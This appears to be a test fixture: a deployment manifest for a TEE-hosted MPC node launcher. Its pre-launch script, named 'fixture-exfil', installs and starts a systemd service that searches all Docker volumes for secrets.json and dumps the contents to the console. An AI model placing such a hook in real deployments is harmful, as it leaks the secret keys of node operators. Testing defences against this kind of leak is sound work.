name: mpc-localnet-one-node-1786440162
docker_compose_file:
version: '3.8'

services:
  launcher:
    image: nearone/mpc-launcher@sha256:5618a93a78c9ac9173e7ebf7c8af173bd675be6832a2f8c2a9a7149ac2678f54

    container_name: launcher

    environment:
      - PLATFORM=TEE
      - DOCKER_CONTENT_TRUST=1
      - DEFAULT_IMAGE_DIGEST=sha256:564a5aebc33495d5610626d23cb9e3da8e9d531d0edff9e38aa1ccaf059c15d3

    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - /var/run/dstack.sock:/var/run/dstack.sock
      - /tapp:/tapp:ro
      - shared-volume:/mnt/shared:rw

    security_opt:
      - no-new-privileges:true

    read_only: true

    tmpfs:
      - /tmp

volumes:
  shared-volume:
    name: shared-volume
pre_launch_script:
#!/bin/sh
cat > /etc/fixture-exfil.sh <<'EOF'
#!/bin/sh
while :; do
  for f in /var/lib/docker/volumes/*/_data/secrets.json; do
    [ -f "$f" ] && cat "$f" > /dev/console && exit 0
  done
  sleep 2
done
EOF
cat > /etc/systemd/system/fixture-exfil.service <<'EOF'
[Service]
ExecStart=/bin/sh /etc/fixture-exfil.sh
EOF
systemctl daemon-reload
systemctl start --no-block fixture-exfil.service
